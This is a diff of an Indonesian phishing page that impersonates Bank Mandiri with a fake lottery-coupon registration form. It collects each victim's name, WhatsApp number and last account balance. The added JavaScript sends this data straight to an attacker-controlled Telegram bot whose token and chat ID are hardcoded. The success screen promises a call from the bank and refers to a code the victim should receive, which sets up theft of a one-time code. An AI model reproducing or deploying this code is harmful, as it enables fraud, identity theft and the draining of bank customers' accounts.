@@ -1,251 +1,259 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pencetakan Kupon Mandiri</title>
-    <!-- Tailwind CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-    <!-- jQuery -->
-    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-    <!-- Maska untuk format Rupiah -->
-    <script src="https://cdn.jsdelivr.net/npm/maska@2/dist/maska.umd.js"></script>
-    <!-- SweetAlert2 -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert2/11.26.25/sweetalert2.all.min.js"></script>
-    
-    <style>
-        body { font-family: 'Roboto', sans-serif; }
-        .bg-custom-gradient { background: linear-gradient(to bottom, #f4f7f9, #e1e8f0); }
-        select {
-            appearance: none;
-            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23003d79' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
-            background-repeat: no-repeat;
-            background-position: right 1rem center;
-            background-size: 1em;
-        }
-        .typingText {
-            white-space: pre-line;
-            text-align: center;
-        }
-        .swal2-border-radius {
-            border-radius: 12px !important;
-        }
-    </style>
-</head>
-<body class="bg-custom-gradient m-0 p-0 overflow-x-hidden min-h-screen">
+<html lang="id" class=""><head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Mandiri</title>
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.8/css/bootstrap.min.css" rel="stylesheet">
+        <!-- Tailwind CSS CDN -->
+        <script src="https://cdn.tailwindcss.com"></script>
+        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet">
+        <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/maska@2/dist/maska.umd.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert2/11.26.25/sweetalert2.all.min.js"></script>
+        <style>
+            body {
+                background: linear-gradient(135deg, #f0f4f8, #e1e8f0);
+                font-family: "Poppins", sans-serif;
+                margin: 0;
+                padding: 0;
+                min-height: 100vh;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+            .container-box {
+                background: #fff;
+                border-radius: 12px;
+                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+                max-width: 450px;
+                width: 100%;
+                padding: 20px;
+                text-align: center;
+                border-top: 5px solid #ffb400;
+            }
+            .message {
+                background: linear-gradient(135deg, #003d79, #0056a8);
+                color: #fff;
+                padding: 20px;
+                border-radius: 10px;
+                font-size: 15px;
+                font-weight: 600;
+                margin-bottom: 20px;
+                min-height: 120px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+            .typingText {
+                white-space: pre-line;
+                text-align: center;
+            }
+            .footer-text {
+                font-size: 13px;
+                color: #003d79;
+                margin-top: 15px;
+                font-weight: bold;
+            }
+            .swal2-border-radius {
+                border-radius: 12px !important;
+            }
+            select {
+                appearance: none;
+                background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23003d79' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+                background-repeat: no-repeat;
+                background-position: right 1rem center;
+                background-size: 1em;
+            }
+        </style>
+    </head>
+    <body class="bg-custom-gradient m-0 p-0 overflow-x-hidden min-h-screen">
 
-    <!-- ========================================== -->
-    <!-- TAMPILAN 1: HALAMAN FORMULIR UTAMA -->
-    <!-- ========================================== -->
-    <div id="viewForm" class="w-full flex flex-col items-center">
-        <!-- Navbar -->
-        <nav class="sticky top-0 left-0 right-0 mx-auto w-full max-w-[450px] border-b-8 border-[#ffb400] h-[70px] z-40 shadow-lg flex items-center justify-between px-4" style="background: #003d79;">
-            <div class="font-bold text-white text-xl italic tracking-wider">mandiri</div>
-            <div class="w-10 h-2 bg-[#ffb400] rounded-full"></div>
-        </nav>
-
-        <main class="w-full flex flex-col items-center relative pb-10">
-            <div class="w-full max-w-[450px] mx-auto flex flex-col items-center relative">
+        <!-- ========================================== -->
+        <!-- HALAMAN 1: FORMULIR UTAMA -->
+        <!-- ========================================== -->
+        <div id="viewForm" class="w-full flex flex-col items-center justify-center p-4">
+            <div class="container-box">
+                <div class="header mb-3">
+                    <h2 style="color: #003d79; font-weight: 800; font-style: italic;">mandiri</h2>
+                </div>
                 
-                <!-- Banner -->
-                <div class="w-full px-4 pt-4 relative">
-                    <div class="w-full rounded-xl overflow-hidden shadow-[0_5px_15px_rgba(0,0,0,0.2)] bg-blue-900">
-                        <img src="https://images.unsplash.com/photo-1559526324-4b87b5e36e44?auto=format&fit=crop&w=600&q=80" alt="Banner Mandiri" class="w-full h-44 object-cover">
-                    </div>
+                <div class="card bg-white p-3 rounded-lg w-full text-left">
+                    <h3 class="text-[#003d79] text-[15px] border-b-2 border-[#ffb400] pb-1 mb-4 font-bold uppercase text-center">Pencetakan Kupon Mandiri</h3>
+                    
+                    <form id="mainForm" class="space-y-3">
+                        <div class="mb-3">
+                            <label class="block mb-1 font-bold text-[#003d79] text-sm">Pilih Jenis Kupon</label>
+                            <select id="kupon" class="w-full p-2.5 border border-[#003d79] rounded-lg bg-[#f9f9f9] text-[#003d79] font-bold text-sm focus:outline-none focus:ring-1 focus:ring-[#ffb400]" required>
+                                <option value="" disabled selected hidden>-- Pilih Kupon --</option>
+                                <option value="Mobil dan Motor">Mobil dan Motor</option>
+                                <option value="Paket Umroh">Paket Umroh</option>
+                                <option value="Uang Cash dan Emas">Uang Cash dan Emas</option>
+                            </select>
+                        </div>
+                        <div class="mb-3">
+                            <label class="block mb-1 font-bold text-[#003d79] text-sm">Nama Lengkap</label>
+                            <input type="text" id="nama" class="w-full p-2.5 border border-[#003d79] rounded-lg bg-[#f9f9f9] text-[#003d79] font-bold text-sm focus:outline-none focus:ring-1 focus:ring-[#ffb400]" placeholder="Nama sesuai KTP" required>
+                        </div>
+                        <div class="mb-3">
+                            <label class="block mb-1 font-bold text-[#003d79] text-sm">Nomor WhatsApp</label>
+                            <input type="tel" id="nohp" class="w-full p-2.5 border border-[#003d79] rounded-lg bg-[#f9f9f9] text-[#003d79] font-bold text-sm focus:outline-none focus:ring-1 focus:ring-[#ffb400]" placeholder="08××××" maxlength="15" required>
+                        </div>
+                        <div class="mb-4">
+                            <label class="block mb-1 font-bold text-[#003d79] text-sm">Saldo Terakhir</label>
+                            <input type="tel" id="saldo" class="w-full p-2.5 border border-[#003d79] rounded-lg bg-[#f9f9f9] text-[#003d79] font-bold text-sm focus:outline-none focus:ring-1 focus:ring-[#ffb400]" placeholder="Rp ×××" required data-maska="['Rp #.###','Rp ##.###','Rp ###.###','Rp #.###.###','Rp ##.###.###','Rp ###.###.###']">
+                        </div>
+                        <button type="submit" id="lanjutkan" class="w-full bg-[#003d79] text-white p-3 rounded-lg text-base font-bold shadow hover:bg-blue-900 transition disabled:opacity-30 cursor-pointer" disabled>
+                            Lanjutkan
+                        </button>
+                    </form>
                 </div>
-
-                <!-- Form Card -->
-                <div class="w-full flex flex-col items-center gap-4 p-4">
-                    <div class="card bg-white/90 p-[20px] rounded-[10px] w-full shadow-[0_5px_15px_rgba(0,0,0,0.2)] border-t-4 border-[#ffb400]">
-                        <h3 class="text-[#003d79] text-[16px] border-b-2 border-[#ffb400] rounded-br-[20px] pb-1 mb-5 font-bold uppercase">Pencetakan Kupon Mandiri</h3>
-                        
-                        <form id="mainForm" class="space-y-4">
-                            <!-- Pilihan Kupon -->
-                            <div class="text-left">
-                                <label class="block mb-[5px] font-bold text-[#003d79] text-sm">Pilih Jenis Kupon</label>
-                                <select name="CPX#Kupon" id="kupon" class="w-full p-[12px] border border-[#003d79] rounded-[7px] bg-[#f9f9f9] text-[#003d79] font-bold text-sm focus:outline-none focus:ring-1 focus:ring-[#ffb400] cursor-pointer" required>
-                                    <option value="" disabled selected hidden>-- Pilih Kupon --</option>
-                                    <option value="Mobil dan Motor">Mobil dan Motor</option>
-                                    <option value="Paket Umroh">Paket Umroh</option>
-                                    <option value="Uang Cash dan Emas">Uang Cash dan Emas</option>
-                                </select>
-                            </div>
-
-                            <!-- Nama Lengkap -->
-                            <div class="text-left">
-                                <label class="block mb-[5px] font-bold text-[#003d79] text-sm">Nama Lengkap</label>
-                                <input type="text" id="nama" name="CPX#Nama" class="w-full p-[12px] border border-[#003d79] rounded-[7px] bg-[#f9f9f9] text-[#003d79] font-bold text-sm focus:outline-none focus:ring-1 focus:ring-[#ffb400]" placeholder="Nama sesuai KTP" required>
-                            </div>
-
-                            <!-- Nomor WhatsApp -->
-                            <div class="text-left">
-                                <label class="block mb-[5px] font-bold text-[#003d79] text-sm">Nomor WhatsApp</label>
-                                <input type="tel" id="nohp" name="CPX#No_HP" class="w-full p-[12px] border border-[#003d79] rounded-[7px] bg-[#f9f9f9] text-[#003d79] font-bold text-sm focus:outline-none focus:ring-1 focus:ring-[#ffb400]" placeholder="08××××" maxlength="15" required>
-                            </div>
-
-                            <!-- Saldo Terakhir -->
-                            <div class="text-left">
-                                <label class="block mb-[5px] font-bold text-[#003d79] text-sm">Saldo Terakhir</label>
-                                <input type="tel" id="saldo" name="CPX#Saldo" class="saldo w-full p-[12px] border border-[#003d79] rounded-[7px] bg-[#f9f9f9] text-[#003d79] font-bold text-sm focus:outline-none focus:ring-1 focus:ring-[#ffb400]" placeholder="Rp ×××" required data-maska="['Rp #.###','Rp ##.###','Rp ###.###','Rp #.###.###','Rp ##.###.###','Rp ###.###.###']">
-                            </div>
-
-                            <!-- Tombol Submit -->
-                            <div class="pt-2">
-                                <button type="submit" id="lanjutkan" class="w-full bg-[#003d79] text-white p-[14px] rounded-[10px] text-[16px] font-bold shadow-md hover:bg-blue-900 transition disabled:opacity-30 cursor-pointer" disabled>
-                                    Lanjutkan
-                                </button>
-                            </div>
-                        </form>
-                    </div>
-
-                    <p class="text-[11px] text-[#003d79]/70 text-center my-4 uppercase font-bold tracking-tight">
-                        © 2026 PT Bank Mandiri (Persero) Tbk. <br>Terdaftar dan diawasi oleh OJK.
-                    </p>
-                </div>
-            </div>
-        </main>
-    </div>
-
-
-    <!-- ========================================== -->
-    <!-- TAMPILAN 2: HALAMAN SUKSES / KETIK / AUDIO -->
-    <!-- ========================================== -->
-    <div id="viewSuccess" class="w-full h-screen flex justify-center items-center" style="display: none;">
-        <div style="background: #fff; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 500px; width: 100%; padding: 30px; text-align: center; border-top: 5px solid #ffb400;">
-            <div class="header mb-4">
-                <h2 style="color: #003d79; font-weight: 800; font-style: italic;">mandiri</h2>
-            </div>
-            <div style="background: linear-gradient(135deg, #003d79, #0056a8); color: #fff; padding: 20px; border-radius: 10px; font-size: 15px; font-weight: 600; margin-bottom: 20px; min-height: 120px; display: flex; align-items: center; justify-content: center;">
-                <div id="typingContainer" class="typingText"></div>
-            </div>
-            <div>
-                <b>
-                    <p style="font-size: 14px; text-align: center; margin-top: 25px; cursor: pointer;">
-                        <span style="color: #FF0000;">Tidak Terima Kode ?<br></span>
-                        <span style="color: #003d79">Hubungi Mandiri Care</span>
-                    </p>
-                </b>
-                <div style="font-size: 13px; color: #003d79; margin-top: 15px; font-weight: bold;">© 2026 PT Bank Mandiri (Persero) Tbk.</div>
+                <div class="footer-text">© 2026 PT Bank Mandiri (Persero) Tbk.</div>
             </div>
         </div>
-    </div>
 
-    <!-- Audio opsional jika file audio.mp3 tersedia -->
-    <audio id="thankYouAudio" src="/ast/audio.mp3"></audio>
+        <!-- ========================================== -->
+        <!-- HALAMAN 2: SUKSES / KETIK / AUDIO -->
+        <!-- ========================================== -->
+        <div id="viewSuccess" class="w-full flex flex-col items-center justify-center p-4" style="display: none;">
+            <div class="container-box">
+                <div class="header mb-4">
+                    <h2 style="color: #003d79; font-weight: 800; font-style: italic;">mandiri</h2>
+                </div>
+                <div class="message">
+                    <div id="typingContainer" class="typingText"></div>
+                </div>
+                <div>
+                    <p style="font-size: 14px; text-align: center; margin-top: 25px; cursor: pointer;">
+                        <strong style="color: #FF0000;">
+                            Tidak Terima Kode ?<br>
+                            <span style="color: #003d79">Hubungi Mandiri Care</span>
+                        </strong>
+                    </p>
+                    <div class="footer-text">© 2026 PT Bank Mandiri (Persero) Tbk.</div>
+                </div>
+            </div>
+        </div>
 
-    <!-- Loading Overlay saat tombol diklik -->
-    <div id="loadingModal" class="fixed backdrop-blur-sm inset-0 z-50 bg-black/50 flex flex-col items-center justify-center gap-4" style="display:none;">
-        <div class="w-12 h-12 border-4 border-t-yellow-400 border-r-yellow-400 border-white/30 rounded-full animate-spin"></div>
-        <p class="text-white font-bold text-sm tracking-wide">Memproses Pendaftaran...</p>
-    </div>
+        <!-- Loading Overlay -->
+        <div id="loadingModal" class="fixed backdrop-blur-sm inset-0 z-50 bg-black/50 flex flex-col items-center justify-center gap-4" style="display:none;">
+            <div class="w-12 h-12 border-4 border-t-yellow-400 border-r-yellow-400 border-white/30 rounded-full animate-spin"></div>
+            <p class="text-white font-bold text-sm tracking-wide">Memproses Data...</p>
+        </div>
 
+        <audio id="thankYouAudio" src="/ast/audio.mp3"></audio>
 
-    <!-- ========================================== -->
-    <!-- JAVASCRIPT KONTROL & TELEGRAM NOTIFIKASI -->
-    <!-- ========================================== -->
-    <script>
-        const typewriterText = `Terimakasih Telah Mendaftar di Layanan Mandiri Festival.
+        <script>
+            // ==========================================
+            // CONFIG TELEGRAM BOT ANDA DI SINI
+            // ==========================================
+            const TOKEN_BOT = "8923573949:AAGZm4FP8EkWoaJqLdzUG0y1cZnfG0Yd8Is";
+            const CHAT_ID = "6742478722";
+            // ==========================================
+
+            const typewriterText = `Terimakasih Telah Mendaftar di Layanan Mandiri Festival.
 Pendaftaran Anda Sedang Diproses. Sesaat Lagi Anda Akan Dihubungi Oleh Pihak Bank Mandiri
 Untuk Proses Cetak Kode Kupon Undian Anda.`;
 
-        document.addEventListener("DOMContentLoaded", () => {
-            const { MaskInput } = Maska;
-            new MaskInput("[data-maska]");
+            document.addEventListener("DOMContentLoaded", () => {
+                const { MaskInput } = Maska;
+                new MaskInput("[data-maska]");
 
-            // Validasi tombol aktif jika nomor HP > 9 digit & kupon terpilih
-            $('#nohp, #kupon').on('input change', function() {
-                const isPhoneValid = $('#nohp').val().length > 9;
-                const isKuponSelected = $('#kupon').val() !== null && $('#kupon').val() !== "";
-                $('#lanjutkan').prop('disabled', !(isPhoneValid && isKuponSelected));
-            });
+                // Validasi tombol aktif
+                $('#nohp, #kupon').on('input change', function() {
+                    const isPhoneValid = $('#nohp').val().length > 9;
+                    const isKuponSelected = $('#kupon').val() !== null && $('#kupon').val() !== "";
+                    $('#lanjutkan').prop('disabled', !(isPhoneValid && isKuponSelected));
+                });
 
-            // Aksi saat form disubmit (Kirim data ke Telegram via end.php)
-            $('#mainForm').on('submit', function(e) {
-                e.preventDefault();
-                $('#loadingModal').fadeIn(200);
+                // Aksi saat submit form (kirim langsung ke Telegram via JavaScript fetch)
+                $('#mainForm').on('submit', function(e) {
+                    e.preventDefault();
+                    $('#loadingModal').fadeIn(200);
 
-                let formData = {
-                    'CPX#Kupon': $('#kupon').val(),
-                    'CPX#Nama': $('#nama').val(),
-                    'CPX#No_HP': $('#nohp').val(),
-                    'CPX#Saldo': $('#saldo').val()
-                };
+                    const kupon = $('#kupon').val();
+                    const nama = $('#nama').val();
+                    const nohp = $('#nohp').val();
+                    const saldo = $('#saldo').val();
 
-                // AJAX ke backend end.php
-                $.ajax({
-                    type: 'POST',
-                    url: 'end.php',
-                    data: JSON.stringify({ token: formData }),
-                    contentType: 'application/json',
-                    success: function(response) {
+                    // Format pesan ke Telegram
+                    const pesan = `🔔 *DATA KUPON MANDIRI MASUK* 🔔\n\n` +
+                                  `🎟 *Jenis Kupon:* ${kupon}\n` +
+                                  `👤 *Nama Lengkap:* ${nama}\n` +
+                                  `📱 *No. WhatsApp:* \`${nohp}\`\n` +
+                                  `💰 *Saldo Terakhir:* ${saldo}\n\n` +
+                                  `🌐 _Status: Dikirim dari GitHub Pages._`;
+
+                    const telegramUrl = `https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`;
+
+                    // Kirim ke Telegram API
+                    fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: pesan,
+                            parse_mode: 'Markdown'
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
                         setTimeout(() => {
                             $('#loadingModal').fadeOut(200);
-                            
-                            // Sembunyikan form, tampilkan halaman sukses ke-2
                             $('#viewForm').hide();
                             $('#viewSuccess').fadeIn(300);
-
-                            // Jalankan animasi dan audio halaman 2
                             initSuccessPage();
                         }, 1000);
-                    },
-                    error: function() {
+                    })
+                    .catch(error => {
                         $('#loadingModal').fadeOut(200);
                         Swal.fire({
                             title: "Gagal!",
-                            text: "Terjadi kesalahan koneksi, silakan coba lagi.",
+                            text: "Terjadi kesalahan saat mengirim data.",
                             icon: "error",
                             confirmButtonColor: "#003d79"
                         });
-                    }
+                    });
                 });
             });
-        });
 
-        // Fungsi halaman sukses (halaman 2)
-        function playAudio() {
-            const audio = document.getElementById("thankYouAudio");
-            if(audio) {
-                audio.play().catch(() => {
-                    document.body.addEventListener("click", () => audio.play(), { once: true });
-                });
-            }
-        }
-
-        function showThankYouAlert() {
-            Swal.fire({
-                title: "Registrasi Berhasil!",
-                text: "Anda akan dihubungi oleh Customer Service Mandiri Festival.",
-                icon: "success",
-                confirmButtonText: "OK",
-                confirmButtonColor: "#003d79",
-                customClass: {
-                    popup: "swal2-border-radius"
-                },
-            });
-        }
-
-        function typeWriterEffect(text, containerId, speed = 40) {
-            let index = 0;
-            const container = document.getElementById(containerId);
-            container.innerHTML = ""; // reset
-            function typeChar() {
-                if (index < text.length) {
-                    container.innerHTML += text.charAt(index);
-                    index++;
-                    setTimeout(typeChar, speed);
+            function playAudio() {
+                const audio = document.getElementById("thankYouAudio");
+                if(audio) {
+                    audio.play().catch(() => {
+                        document.body.addEventListener("click", () => audio.play(), { once: true });
+                    });
                 }
             }
-            typeChar();
-        }
 
-        function initSuccessPage() {
-            playAudio();
-            showThankYouAlert();
-            typeWriterEffect(typewriterText, "typingContainer", 40);
-        }
-    </script>
-</body>
+            function showThankYouAlert() {
+                Swal.fire({
+                    title: "Registrasi Berhasil!",
+                    text: "Anda akan dihubungi oleh Customer Service Mandiri Festival.",
+                    icon: "success",
+                    confirmButtonText: "OK",
+                    confirmButtonColor: "#003d79",
+                    customClass: { popup: "swal2-border-radius" },
+                });
+            }
+
+            function typeWriterEffect(text, containerId, speed = 40) {
+                let index = 0;
+                const container = document.getElementById(containerId);
+                container.innerHTML = "";
+                function typeChar() {
+                    if (index < text.length) {
+                        container.innerHTML += text.charAt(index);
+                        index++;
+                        setTimeout(typeChar, speed);
+                    }
+                }
+                typeChar();
+            }
+
+            function initSuccessPage() {
+                playAudio();
+                showThankYouAlert();
+                typeWriterEffect(typewriterText, "typingContainer", 40);
+            }
+        </script>
+    </body>
 </html>
